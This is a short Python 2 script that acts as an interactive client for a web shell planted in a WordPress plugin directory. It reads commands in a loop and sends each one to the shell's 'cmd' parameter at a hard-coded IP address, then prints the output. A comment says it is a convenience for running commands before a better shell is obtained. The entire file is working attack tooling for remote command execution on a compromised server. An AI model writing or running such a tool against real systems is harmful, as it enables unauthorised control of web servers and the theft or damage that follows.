#!/usr/bin/python
# GNU GPLv2 License.
# Modify the address and then you can run commands like if you are in a shell. That's just more convinient when you can't get another shell yet.

import requests

while 1==1:
    command = raw_input('dolan@pls: ')
    shellget = "http://10.1.1.1/wp-content/plugins/shell/shell.php?cmd="
    req_shellget=str(shellget+command)
    rv = requests.get(req_shellget)
    print rv.content
